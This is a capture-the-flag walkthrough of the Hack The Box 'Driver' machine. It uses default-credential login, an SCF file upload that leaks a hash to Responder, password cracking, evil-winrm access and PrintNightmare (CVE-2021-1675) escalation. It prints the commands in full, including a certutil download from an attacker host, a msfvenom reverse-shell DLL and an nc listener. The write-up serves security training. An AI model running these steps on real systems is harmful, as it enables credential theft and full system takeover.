## Enumeration

Open ports: 80 (IIS httpd 10.0), 135 (RPC), 445 (smb), 5985 (winrm)

We can see a web target straight away, along with some RPC/SMB and WinRM. The web service is interesting as we’re prompted for HTTP basic authentication. Pulling up a browser, you see the same prompt “Please enter the password for admin”. Feels like a massive clue to me. I try admin:admin as my authentication. Sure enough this works.


## Web

Navigating to the main page a authentication prompt appears. These prompts are often misconfigured to  
default creds admin:admin.

After login, the only active clickable link on the web application is the Firmware Updates tab. This page has an upload functionality and after playing around for a bit we find that there are not filters and we can upload anything. To exploit this we'll need to know where (directory) files are uploaded to. 

We can start a fuzzer like ffuf to find other hidden web locations.

```bash
ffuf -c -w -H 'Authentication: Basic YWRtaW46YWRtaW4=' /usr/share/wordlists/dirb/big.txt -u http://10.10.11.106/FUZZ -e .php,.zip,.txt,.pdf
```

Okay so SCF files are nasty little things that allow you to perform a really pathetically small amount of Explorer commands. The one you’ll be most familiar with is “Show Desktop”. Yeah, that button is just an SCF file.

You can read more about attacks using SCF files here: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

Create a text file called `@test.scf`. The `@` is to put the scf file to the top of the directory so an user can execute this. Then we can use responder to capture a hash if this box is vulnerable to an SCF file attack.
```bash
[Shell]
Command=2
IconFile=\\<attack-ip>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```
Whilst there is UNC path indicating a share called ‘share’ I have nothing of the sort to offer. No sweet icons, just a serving of Responder.

`responder -wrf -I tun0`

Now in theory someone would have to have browsed to this file to make it work. That is apparently what is going on though as our Responder instance provides us with a hash!

`tony::DRIVER:NTLM`
This is an NTLMv2 hash which we can crack to reveal the password: `liltony`

Now we have a path through WinRM which we found exposed. 

`evil-winrm -u Tony -p liltony -i driver.htb`

If we look to the `fw_up.php` source code we can find where the uploads end up which is in `c:\firmwares`.

Since there is a printer service, we can try printnightmare, a new exploit CVE-2021-1675 to force ourselves in as SYSTEM. There's a PS module for this [here](https://github.com/calebstewart/CVE-2021-1675)

`certutil.exe -urlcache -f http://10.10.16.2:1234/CVE-2021-1675.ps1 nightmare.ps1`

However, we are unauthorized to execute the scipt! 

There’s a Python version of this we can run from our Kali instance [here](https://github.com/cube0x0/CVE-2021-1675)

As a prerequisite we need a malicius dll payload that will send us a remote shell. The Python script will inject this into the Print Spooler.:

`msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST LPORT=4444 -f dll -o test.dll`

The file we end up creating here needs to be hosted somewhere and the easiest approach is a samba server.

`impacket-smbserver share . -smb2support`

Now open a listener
`nc -nvlp 4444`

Wait to get the callback and we're system!